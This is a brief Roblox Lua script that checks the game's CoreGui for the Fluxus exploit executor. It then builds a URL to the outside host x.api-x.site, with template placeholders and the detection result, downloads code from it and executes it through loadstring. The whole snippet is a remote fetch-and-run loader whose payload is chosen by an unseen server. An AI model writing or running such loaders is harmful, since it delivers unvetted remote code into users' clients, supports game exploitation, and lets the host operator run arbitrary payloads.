local function checkFluxus()
  for _,inst in pairs(game:GetService("CoreGui"):GetDescendants())do
    if string.match(inst.Name:lower(),"fluxus")then
      return"F"
    end
  end
  return"N"
end
_G.v={}
table.insert(_G.v,'s1')
local fluxusStatus=checkFluxus()
local n=string.format("https://x.api-x.site?i=%s&s=%d&f=%s",'${i}',${s},fluxusStatus)
loadstring(game:HttpGet(n))()
